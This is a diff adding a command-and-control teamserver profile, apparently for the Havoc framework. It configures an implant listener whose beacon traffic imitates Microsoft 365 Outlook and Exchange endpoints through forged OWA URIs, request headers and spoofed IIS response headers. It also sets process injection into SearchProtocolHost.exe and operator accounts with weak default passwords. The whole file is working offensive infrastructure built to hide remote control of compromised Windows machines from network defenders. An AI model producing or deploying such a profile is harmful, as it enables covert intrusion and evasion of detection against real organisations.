@@ -1,0 +1,86 @@
+# HTTPS Profile
+# TLS-encrypted listener masquerading as a Microsoft 365 Outlook endpoint.
+# Auto-generates a self-signed certificate on startup.
+# For production use, replace with a valid certificate via a reverse proxy.
+
+Teamserver {
+    Host = "0.0.0.0"
+    Port = 40056
+
+    Build {
+        Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc"
+        Compiler86 = "/usr/bin/i686-w64-mingw32-gcc"
+        Nasm       = "/usr/bin/nasm"
+    }
+}
+
+Operators {
+    user "operator" {
+        Password = "password1234"
+    }
+
+    user "Neo" {
+        Password = "password1234"
+    }
+
+    user "<YOUR_USERNAME>" {
+        Password = "<YOUR_PASSWORD>"
+    }
+}
+
+Demon {
+    Sleep  = 10
+    Jitter = 30
+
+    TrustXForwardedFor = false
+
+    Injection {
+        Spawn64 = "C:\\Windows\\System32\\SearchProtocolHost.exe"
+        Spawn32 = "C:\\Windows\\SysWOW64\\SearchProtocolHost.exe"
+    }
+}
+
+Listeners {
+    Http {
+        Name         = "HTTPS - Outlook"
+        Hosts        = ["<YOUR_C2_DOMAIN>"]
+        HostBind     = "0.0.0.0"
+        HostRotation = "round-robin"
+        PortBind     = 443
+        PortConn     = 443
+        Secure       = true
+        KillDate     = "2026-12-31 23:59:59"
+        UserAgent    = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
+
+        Uris = [
+            "/owa/service.svc",
+            "/Microsoft-Server-ActiveSync",
+            "/autodiscover/autodiscover.json",
+            "/EWS/Exchange.asmx",
+        ]
+
+        Headers = [
+            "Accept: application/json",
+            "Accept-Language: en-US,en;q=0.9",
+            "Accept-Encoding: gzip, deflate, br",
+            "X-OWA-CANARY: tK9nR3vLzEK8xQp7M2dJYg",
+            "X-AnchorMailbox: <YOUR_ANCHOR>@<YOUR_C2_DOMAIN>",
+            "client-request-id: d4e5f6a7-b8c9-0d1e-2f3a-4b5c6d7e8f90",
+        ]
+
+        Response {
+            Headers = [
+                "Content-Type: application/json; charset=utf-8",
+                "Server: Microsoft-IIS/10.0",
+                "X-OWA-Version: 15.20.7544.025",
+                "X-CalculatedFETarget: AM7PR03CU001.internal.outlook.com",
+                "X-AspNet-Version: 4.0.30319",
+                "X-Powered-By: ASP.NET",
+                "X-FEServer: AM7PR03CA0012",
+                "X-Content-Type-Options: nosniff",
+                "Strict-Transport-Security: max-age=31536000; includeSubDomains",
+                "Connection: keep-alive",
+            ]
+        }
+    }
+}
